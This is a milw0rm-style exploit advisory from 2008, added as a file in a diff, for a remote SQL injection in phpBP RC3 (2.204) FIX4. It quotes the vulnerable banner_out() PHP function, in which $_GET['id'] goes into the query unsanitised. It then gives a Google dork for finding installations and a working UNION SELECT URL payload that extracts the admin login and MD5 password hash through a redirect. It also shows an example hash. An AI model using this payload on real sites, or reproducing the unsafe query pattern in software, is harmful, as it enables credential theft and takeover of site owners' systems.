@@ -1,0 +1,51 @@
+.-----------------------------------------------------------------------------.
+|  vuln.: phpBP <= RC3 (2.204) FIX4 Remote SQL Injection Vulnerability        |
+|  download: http://www.phpbp.com/                                            |
+|  dork: "PHP BP Team"                                                        |
+|                                                                             |
+|  author: irk4z@yahoo.pl                                                     |
+|  homepage: http://irk4z.wordpress.com/                                      |
+|                                                                             |
+|                        --->    HACKBOX.pl    <---                           |
+|                                                                             |
+|  greets to: cOndemned, str0ke, wacky                                        |
+'-----------------------------------------------------------------------------'
+
+# code:
+
+ ./includes/functions/banners-external.php:
+ ...
+3   function banner_out() //zlicza ilosc klikniec na banner
+4   {
+5    global $conf;
+6 
+7    if($_GET['id'])
+8    {
+9     SQLvalidate($_POST['id']);
+10
+11    $db = new dbquery;
+12    $db->query("SELECT * FROM $conf[prefix]banners WHERE id=$_GET[id]") or $db->err(__FILE__, __LINE__); 
+13 
+14    if($db->num_rows()==0)
+15    {
+16     redirect('index.php?module=error?error=banners_error2');
+17     exit;
+18    } 
+19 
+20    $d=$db->fetch_object();
+21    $db->query("UPDATE $conf[prefix]banners SET views=views+1 WHERE id='$_GET[id]'") or $db->err(__FILE__, __LINE__); 
+22 
+23    redirect($d->url);
+24   }
+25
+26   exit;
+27  }
+ ...
+
+# exploit:
+
+http://[host]/[path]/index.php?function=banner_out&id=10000/**/LIMIT/**/0/**/UNION/**/SELECT/**/1,2,concat(0x687474703A2F2F,login,0x5F,pass),4,5,6,7,8,9/**/FROM/**/phpbp_users/**/LIMIT/**/1/*
+
+you will be redirect to http://[login]_[md5_hash_pass] (ex. http://admin_21232f297a57a5a743894a0e4a801fc3/)
+
+# milw0rm.com [2008-03-16]
